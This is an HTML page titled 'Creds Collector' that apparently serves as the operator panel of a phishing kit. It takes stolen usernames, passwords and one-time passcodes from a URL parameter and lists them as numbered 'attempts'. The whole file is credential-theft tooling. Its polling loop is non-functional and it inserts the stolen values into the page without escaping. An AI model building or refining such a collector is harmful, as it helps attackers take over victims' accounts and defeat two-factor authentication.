<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Creds Collector</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        #credsLog { white-space: pre-wrap; }
    </style>
</head>
<body>
    <h2>Collected Credentials</h2>
    <div id="credsLog"></div>
    <script>
        let credsLog = [];

        // Check URL params and log creds
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const creds = urlParams.get('creds');
            if (creds) {
                try {
                    const parsedCreds = JSON.parse(decodeURIComponent(creds));
                    credsLog.push(parsedCreds);
                    updateDisplay();
                } catch (e) {
                    console.error('Invalid creds:', e);
                }
            }

            // Poll for new creds (simplified)
            setInterval(() => {
                fetch(window.location.href).then(response => response.text()).then(() => updateDisplay());
            }, 5000);
        };

        function updateDisplay() {
            let logHtml = '';
            credsLog.forEach((creds, index) => {
                logHtml += `
                    <div style="margin-bottom: 20px;">
                        <h3>Attempt ${index + 1} (${creds.time})</h3>
                        <p><strong>Username:</strong> ${creds.username || 'N/A'}</p>
                        <p><strong>Password:</strong> ${creds.password || 'N/A'}</p>
                        <p><strong>Code (OTP):</strong> ${creds.code || 'Not submitted'}</p>
                    </div>
                `;
            });
            document.getElementById('credsLog').innerHTML = logHtml || '<p>No credentials collected yet.</p>';
        }
    </script>
</body>
</html>
